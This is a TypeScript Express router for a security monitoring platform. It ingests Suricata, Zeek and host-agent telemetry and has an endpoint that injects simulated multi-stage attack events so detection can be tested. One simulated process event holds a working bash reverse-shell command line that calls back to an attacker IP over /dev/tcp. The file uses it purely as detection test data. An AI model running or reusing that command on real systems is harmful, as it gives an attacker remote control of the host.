/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { Router, Request, Response } from 'express';
import { CorrelationEngine } from './correlationEngine.js';
import { DbSchema } from '../db/schema.js';
import { RawSecurityEvent, Host } from '../../src/types.js';

export function createIngestRouter(
  dbState: DbSchema,
  saveDb: () => void,
  correlationEngine: CorrelationEngine,
  broadcastWs: (msg: any) => void,
  addAuditLog: (userId: string, email: string, action: string, resource: string, ip: string, status: 'success' | 'failure', role?: string) => void
) {
  const router = Router();

  /**
   * Suricata EVE JSON Ingestion Endpoint
   * Supports both single JSON object and newline-delimited JSON (NDJSON)
   */
  router.post('/suricata', async (req: Request, res: Response) => {
    try {
      const payload = req.body;
      const events: any[] = Array.isArray(payload) ? payload : [payload];
      const processed: RawSecurityEvent[] = [];

      for (const eve of events) {
        // Map Suricata EVE JSON to Normalized RawSecurityEvent
        const eventType = eve.event_type || 'alert';
        let severity: RawSecurityEvent['severity'] = 'info';
        
        if (eve.alert) {
          const prio = eve.alert.severity || 3;
          severity = prio === 1 ? 'critical' : prio === 2 ? 'high' : 'medium';
        }

        const normalized: RawSecurityEvent = {
          id: 'sur_' + Math.random().toString(36).substring(2, 9),
          timestamp: eve.timestamp || new Date().toISOString(),
          sourceType: 'suricata',
          sensorId: eve.host || 'suricata-perimeter-nids',
          sourceIp: eve.src_ip || '0.0.0.0',
          sourcePort: eve.src_port,
          destIp: eve.dest_ip || '0.0.0.0',
          destPort: eve.dest_port,
          protocol: eve.proto || 'TCP',
          eventType: eve.alert ? 'exploit_detected' : eventType,
          details: {
            signature: eve.alert?.signature,
            category: eve.alert?.category,
            severityNumber: eve.alert?.severity,
            flowId: eve.flow_id,
            http: eve.http,
            dns: eve.dns,
            tls: eve.tls,
            payload: eve.payload_printable
          },
          severity,
          confidence: eve.alert?.severity === 1 ? 0.95 : 0.85,
          mitre: eve.alert?.signature?.toLowerCase().includes('exploit') || eve.alert?.signature?.toLowerCase().includes('log4j')
            ? { tactic: 'Initial Access', technique: 'T1190' }
            : eve.alert?.signature?.toLowerCase().includes('scan')
            ? { tactic: 'Reconnaissance', technique: 'T1046' }
            : { tactic: 'Execution', technique: 'T1059' }
        };

        await correlationEngine.processEvent(normalized);
        processed.push(normalized);
      }

      res.status(200).json({ status: 'ok', received: processed.length });
    } catch (err: any) {
      console.error('[Ingest:Suricata] Parse error:', err);
      res.status(400).json({ error: 'Failed to process Suricata EVE JSON telemetry.' });
    }
  });

  /**
   * Zeek NSM Telemetry Ingestion Endpoint
   */
  router.post('/zeek', async (req: Request, res: Response) => {
    try {
      const payload = req.body;
      const records: any[] = Array.isArray(payload) ? payload : [payload];
      const processed: RawSecurityEvent[] = [];

      for (const rec of records) {
        const isNotice = rec._path === 'notice' || rec.note;
        const normalized: RawSecurityEvent = {
          id: 'zeek_' + Math.random().toString(36).substring(2, 9),
          timestamp: rec.ts ? new Date(rec.ts * 1000).toISOString() : new Date().toISOString(),
          sourceType: 'zeek',
          sensorId: 'zeek-nsm-cluster',
          sourceIp: rec['id.orig_h'] || rec.source_ip || '0.0.0.0',
          sourcePort: rec['id.orig_p'] || rec.source_port,
          destIp: rec['id.resp_h'] || rec.dest_ip || '0.0.0.0',
          destPort: rec['id.resp_p'] || rec.dest_port,
          protocol: rec.proto || 'TCP',
          eventType: isNotice ? 'zeek_notice' : 'network_flow',
          details: {
            service: rec.service,
            duration: rec.duration,
            origBytes: rec.orig_bytes,
            respBytes: rec.resp_bytes,
            connState: rec.conn_state,
            note: rec.note,
            msg: rec.msg
          },
          severity: isNotice ? 'high' : 'info',
          confidence: 0.88,
          mitre: isNotice ? { tactic: 'Reconnaissance', technique: 'T1046' } : undefined
        };

        await correlationEngine.processEvent(normalized);
        processed.push(normalized);
      }

      res.status(200).json({ status: 'ok', received: processed.length });
    } catch (err: any) {
      console.error('[Ingest:Zeek] Parse error:', err);
      res.status(400).json({ error: 'Failed to process Zeek NSM records.' });
    }
  });

  /**
   * EncDec Real Host Agent Ingestion Endpoint
   * Accepts live telemetry from running servers (Linux, Windows, macOS)
   */
  router.post('/host-agent', async (req: Request, res: Response) => {
    try {
      const { hostId, hostName, os, ipAddress, processes, fileChanges, cpu, memory, disk, suspiciousEvents } = req.body;

      // Automatically register or update host
      let host = dbState.hosts.find(h => h.id === hostId || h.name === hostName || h.ipAddress === ipAddress);
      if (!host) {
        host = {
          id: hostId || 'hst_' + Math.random().toString(36).substring(2, 9),
          name: hostName || ipAddress || 'Unknown Endpoint',
          os: os || 'linux',
          ipAddress: ipAddress || req.ip || '127.0.0.1',
          status: 'online',
          lastSeen: new Date().toISOString(),
          agentVersion: 'encdec-agent-v2.0-real',
          cpuUsage: cpu || 12,
          memoryUsage: memory || 34,
          diskUsage: disk || 50,
          createdAt: new Date().toISOString()
        };
        dbState.hosts.push(host);
        addAuditLog('system', 'agent@encdec.io', 'New Host Agent Enrolled', host.name, req.ip || '127.0.0.1', 'success');
        broadcastWs({ type: 'HOSTS_UPDATE', payload: dbState.hosts });
      } else {
        host.status = 'online';
        host.lastSeen = new Date().toISOString();
        if (cpu !== undefined) host.cpuUsage = cpu;
        if (memory !== undefined) host.memoryUsage = memory;
        if (disk !== undefined) host.diskUsage = disk;
      }

      // Check for suspicious processes
      if (Array.isArray(processes)) {
        for (const proc of processes) {
          if (proc.suspicious) {
            const rawEvt: RawSecurityEvent = {
              id: 'agt_' + Math.random().toString(36).substring(2, 9),
              timestamp: new Date().toISOString(),
              sourceType: 'host_agent',
              sensorId: `agent-${host.name}`,
              hostId: host.id,
              eventType: 'process_spawn',
              details: {
                pid: proc.pid,
                processName: proc.name,
                commandLine: proc.cmdline || proc.name,
                user: proc.user,
                path: proc.path,
                suspicious: true
              },
              severity: 'critical',
              confidence: 0.95,
              mitre: { tactic: 'Execution', technique: 'T1059' }
            };
            await correlationEngine.processEvent(rawEvt);
          }
        }
      }

      // Check for File Integrity Monitoring (FIM) changes
      if (Array.isArray(fileChanges)) {
        for (const file of fileChanges) {
          const isCritical = file.filePath?.includes('/etc/shadow') || 
                             file.filePath?.includes('/etc/passwd') || 
                             file.filePath?.includes('cron') || 
                             file.filePath?.includes('systemd');
          
          if (isCritical || file.action === 'created') {
            const rawEvt: RawSecurityEvent = {
              id: 'fim_' + Math.random().toString(36).substring(2, 9),
              timestamp: file.timestamp || new Date().toISOString(),
              sourceType: 'host_agent',
              sensorId: `agent-${host.name}`,
              hostId: host.id,
              eventType: 'file_modify',
              details: file,
              severity: isCritical ? 'high' : 'medium',
              confidence: 0.92,
              mitre: { tactic: 'Persistence', technique: 'T1053' }
            };
            await correlationEngine.processEvent(rawEvt);
          }
        }
      }

      saveDb();
      res.status(200).json({ status: 'ok', hostId: host.id, commandsPending: [] });
    } catch (err: any) {
      console.error('[Ingest:HostAgent] Ingestion failure:', err);
      res.status(400).json({ error: 'Failed to process host agent telemetry.' });
    }
  });

  /**
   * Evaluation Laboratory / Attack Simulation Controller
   * Allows SOC teams and evaluators to trigger real-world multi-stage attack scenarios
   * to test detection, correlation, and response capabilities.
   */
  router.post('/simulate-scenario', async (req: Request, res: Response) => {
    try {
      const scenario = req.body.scenario || 'web_compromise';
      const targetHost = dbState.hosts[0] || { id: 'hst_1', name: 'portal.coou.edu.ng', ipAddress: '104.24.12.83' };
      const attackerIp = req.body.attackerIp || '185.220.101.42';

      if (scenario === 'web_compromise') {
        // Stage 1: Reconnaissance (Zeek)
        const evt1: RawSecurityEvent = {
          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
          timestamp: new Date().toISOString(),
          sourceType: 'zeek',
          sensorId: 'zeek-nsm-cluster',
          sourceIp: attackerIp,
          sourcePort: 49120,
          destIp: targetHost.ipAddress,
          destPort: 443,
          protocol: 'TCP',
          eventType: 'port_recon',
          details: { scanType: 'SYN Stealth Sweep', ports: [80, 443, 8080, 8443] },
          severity: 'medium',
          confidence: 0.89,
          mitre: { tactic: 'Reconnaissance', technique: 'T1046' }
        };
        await correlationEngine.processEvent(evt1);

        // Stage 2: Initial Access Exploit (Suricata)
        const evt2: RawSecurityEvent = {
          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
          timestamp: new Date().toISOString(),
          sourceType: 'suricata',
          sensorId: 'suricata-perimeter-nids',
          sourceIp: attackerIp,
          sourcePort: 49122,
          destIp: targetHost.ipAddress,
          destPort: 443,
          protocol: 'HTTP',
          eventType: 'exploit_detected',
          details: { signature: 'ET EXPLOIT Apache Log4j / Spring4Shell RCE Header Injection', cve: 'CVE-2021-44228' },
          severity: 'critical',
          confidence: 0.97,
          mitre: { tactic: 'Initial Access', technique: 'T1190' }
        };
        await correlationEngine.processEvent(evt2);

        // Stage 3: Execution on Host (HIDS Agent)
        const randomPid = Math.floor(Math.random() * 20000) + 10000;
        const evt3: RawSecurityEvent = {
          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
          timestamp: new Date().toISOString(),
          sourceType: 'host_agent',
          sensorId: `agent-${targetHost.name}`,
          hostId: targetHost.id,
          eventType: 'process_spawn',
          details: { parentPid: 3042, parentName: 'nginx', pid: randomPid, processName: 'sh -i', commandLine: `/bin/sh -i >& /dev/tcp/${attackerIp}/4444 0>&1`, user: 'www-data' },
          severity: 'critical',
          confidence: 0.98,
          mitre: { tactic: 'Execution', technique: 'T1059.004' }
        };
        await correlationEngine.processEvent(evt3);

        addAuditLog('system', 'analyst@encdec.io', 'Evaluation Lab: Attack Scenario Injected', 'web_compromise', req.ip || '127.0.0.1', 'success');
        res.status(200).json({ status: 'ok', scenario: 'web_compromise', message: 'Injected 3-stage attack pattern: Zeek Recon -> Suricata Exploit -> HIDS Shell Spawn.' });
      } else if (scenario === 'ssh_brute') {
        const evt: RawSecurityEvent = {
          id: 'sim_evt_' + Math.random().toString(36).substring(2, 7),
          timestamp: new Date().toISOString(),
          sourceType: 'host_agent',
          sensorId: `agent-${targetHost.name}`,
          hostId: targetHost.id,
          sourceIp: attackerIp,
          eventType: 'failed_auth',
          details: { service: 'sshd', user: 'root', attempts: 24, windowSeconds: 30 },
          severity: 'high',
          confidence: 0.94,
          mitre: { tactic: 'Credential Access', technique: 'T1110.001' }
        };
        await correlationEngine.processEvent(evt);
        res.status(200).json({ status: 'ok', scenario: 'ssh_brute' });
      } else {
        res.status(400).json({ error: 'Unknown scenario.' });
      }
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  return router;
}
